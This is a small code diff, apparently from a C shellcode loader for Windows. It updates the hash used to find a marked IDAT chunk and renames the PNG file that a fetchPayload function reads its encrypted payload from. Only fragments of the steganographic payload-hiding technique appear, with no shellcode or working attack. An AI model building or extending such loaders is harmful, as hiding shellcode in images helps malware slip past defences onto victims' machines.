@@ -19,7 +19,7 @@
 // TO UPDATE with respect to every new created PNG:
 //
 //
-#define MARKED_IDAT_HASH	  0x8477E193
+#define MARKED_IDAT_HASH	  0xC25031A4
 
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 // ---------------------------------------------------------------------------------------------------------------------------------------------
@@ -283,7 +283,7 @@ int fetchPayload() {
 	SIZE_T sShellcodeSize = 0x00;
 
 	// Read PNG file from disk
-	if (!ReadFileFromDiskA("output.png", &pPngFileBuffer, &sPngFileSize))
+	if (!ReadFileFromDiskA("CurveLock.png", &pPngFileBuffer, &sPngFileSize))
 		return -1;
 
 	// Extract decrypted payload from PNG file
